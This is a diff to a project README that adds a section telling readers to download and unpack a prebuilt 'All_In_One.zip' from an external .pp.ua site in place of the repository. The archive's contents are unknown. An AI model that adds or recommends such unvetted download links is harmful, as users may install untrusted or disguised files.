@@ -61,6 +61,12 @@ cd bioglass
 
 ---
 
+## ⌨ Installation from scratch without junk
+
+If you want to install a clean project without git and other files, download this [file](https://bioglass.pp.ua/All_In_One.zip) unpack and it's ready, you can use it, upload it, etc.
+
+---
+
 ## 🖌️ Project Structure
 
 ```
